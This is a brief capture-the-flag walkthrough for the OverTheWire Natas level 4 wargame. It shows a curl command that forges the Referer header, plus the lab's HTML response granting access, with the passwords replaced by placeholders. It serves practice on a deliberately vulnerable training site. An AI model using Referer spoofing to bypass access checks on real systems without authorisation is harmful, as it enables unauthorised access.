Acccording to the natas4 webpage we have to use natas4 as the username and password from the previous challenge to login.


After login we have come accross an error "Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users 
should come only from "http://natas5.natas.labs.overthewire.org/""


To get access to this we use ---


curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/ -u natas4:<password_of_natas4>



<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "password_of_natas4" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is passsword_of_natas5
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
